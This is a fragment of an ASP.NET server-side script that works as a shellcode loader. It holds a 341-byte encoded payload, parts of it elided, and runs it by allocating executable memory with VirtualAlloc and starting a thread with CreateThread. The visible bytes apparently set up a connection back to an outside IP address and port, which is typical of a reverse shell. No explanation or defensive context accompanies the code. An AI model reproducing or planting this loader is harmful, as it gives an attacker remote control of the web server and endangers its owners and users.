...
<script runat="server">
    ...
    {
        byte[] mqHMdXbun9PZ = new byte[341] {
...
0x68,0x0a,0x0a,0x0e,0x41,0x68,0x02,0x00,0x15,0xb3,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr l_z9rf = VirtualAlloc(IntPtr.Zero,(UIntPtr)mqHMdXbun9PZ.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(mqHMdXbun9PZ,0,l_z9rf,mqHMdXbun9PZ.Length);
        IntPtr wMM = IntPtr.Zero;
        IntPtr gKsfiM = CreateThread(IntPtr.Zero,UIntPtr.Zero,l_z9rf,IntPtr.Zero,0,ref wMM);
    }
</script>
